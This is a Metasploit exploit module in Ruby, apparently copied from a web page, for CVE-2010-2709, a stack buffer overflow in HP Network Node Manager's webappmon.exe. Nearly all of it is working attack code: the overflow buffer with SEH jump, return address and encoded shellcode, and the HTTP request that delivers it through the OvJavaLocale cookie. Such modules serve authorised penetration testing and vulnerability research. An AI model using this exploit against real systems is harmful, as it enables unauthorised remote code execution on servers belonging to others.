# $Id: hp_nnm_webappmon_ovjavalocale.rb 12087 2011-03-23 03:39:12Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;        => "HP NNM CGI webappmon.exe OvJavaLocale Buffer Overflow",
            &#039;Description&#039; => %q{
                This module exploits a stack-based overflow in HP NNM&#039;s webappmon.exe.
                The vulnerability occurs when a long string of data is sent as OvJavaLocale&#039;s
                cookie value, OvWww.dll fails to properly do any bounds checking before this
                input is parsed in function OvWwwDebug(), which causes an overflow when
                sprintf_new() is called.
            &#039;},
            &#039;License&#039;     => MSF_LICENSE,
            &#039;Version&#039;     => "$Revision: 12087 $",
            &#039;Author&#039;      =>
                [
                    &#039;Nahuel Riva&#039;,
                    &#039;sinn3r&#039;
                ],
            &#039;References&#039; =>
                [
                    [&#039;CVE&#039;, &#039;2010-2709&#039;],
                    [&#039;OSVDB&#039;, &#039;66932&#039;],
                    [&#039;OSVDB&#039;, &#039;http://www.coresecurity.com/content/hp-nnm-ovjavalocale-buffer-overflow&#039;],
                ],
            &#039;Payload&#039;    =>
                {
                    &#039;BadChars&#039; => [*(0x00..0x09)].pack("C*") + [*(0x0a..0x0f)].pack("C*") + [*(0x10..0x1f)].pack("C*") + "\x7f",
                    &#039;EncoderType&#039; => Msf::Encoder::Type::AlphanumMixed,
                    &#039;EncoderOptions&#039; => { "BufferRegister"=>"ECX"  }
                },
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => "seh",
                    "AutoRunScript" => "migrate -f",
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;    =>
                [
                    [ &#039;Windows Server 2003 Enterprise&#039;, {&#039;Ret&#039;=>0x5A30532D} ],
                ],
            &#039;Privileged&#039;    => false,
            &#039;DisclosureDate&#039; => "Aug 3 2010"))
 
            register_options(
                [
                    Opt::RPORT(80),
                ], self.class)
    end
 
    def exploit
 
        nops = make_nops(1000)*10
 
        sploit  = nops[0, 7044]             #Padding
        sploit << "\x74\x20\x42\x42"      #JE jump 0x20 bytes
        sploit << [target.ret].pack(&#039;V&#039;)  #POP/POP/RET
        sploit << nops[0, 26]             #Padding
        sploit << "\x61"*13                   #POPAD x 13
        sploit << "\x51"                  #PUSH ECX
        sploit << "\xc3"                  #RETN
        sploit << nops[0, 31]             #Padding
        sploit << payload.encoded         #Payload
        sploit << nops[0, 10000-sploit.length]
 
        connect
 
        print_status("Sending malicious request...")
        send_request_raw({
            "uri"     => "/OvCgi/webappmon.exe",
            "data"    => "ins=nowait&sel=A&appB=&actC=&arg=&help=&cache=1600",
            "version" => "1.1",
            "method"  => "GET",
            "headers" => {
                "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language" => "en-us,en;q=0.5",
                "Accept-Encoding" => "gzip,deflate",
                "Accept-Charset" => "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                "Keep-Alive" => "300",
                "Connection" => "keep-alive",
                "Cookie" => "OvJavaLocale=#{sploit}.Cp1252;OvWebSession=14150:AnyUser%3a",
                "Cache-Control" => "max-age=0"
            }
        }, 2)
 
        handler
        disconnect
 
    end
end



